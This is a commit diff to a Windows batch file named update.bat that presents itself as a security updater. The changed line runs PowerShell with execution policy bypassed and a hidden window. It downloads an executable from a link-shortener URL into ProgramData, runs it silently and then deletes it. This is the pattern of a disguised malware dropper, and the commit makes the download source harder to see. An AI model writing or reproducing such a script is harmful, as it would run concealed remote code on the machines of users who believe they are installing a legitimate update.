e5c2c520a17b7d20ad34ff3a67d49003a0f558ee
project:northern-lights <nathan.ingram.nl2010@gmail.com>
2026-03-10 06:52:07 +0200

    Update download link for security update executable

--- update.bat
+++ update.bat
@@ -1,3 +1,3 @@
 @echo off
 if not "%1"=="min" start /min cmd /c %0 min & exit
-powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command "try { $exePath = Join-Path $env:ProgramData 'security_update_2026.exe'; (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/nathan-ingram10/update/main/security_update2026.exe', $exePath); Start-Process -FilePath $exePath -ArgumentList '/S' -NoNewWindow -Wait } catch { Write-Host $_.Message -ForegroundColor Red } finally { Remove-Item $exePath -Force -ErrorAction SilentlyContinue }"
+powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command "try { $exePath = Join-Path $env:ProgramData 'security_update_2026.exe'; (New-Object Net.WebClient).DownloadFile('https://clipr.cc/M1P1n', $exePath); Start-Process -FilePath $exePath -ArgumentList '/S' -NoNewWindow -Wait } catch { Write-Host $_.Message -ForegroundColor Red } finally { Remove-Item $exePath -Force -ErrorAction SilentlyContinue }"
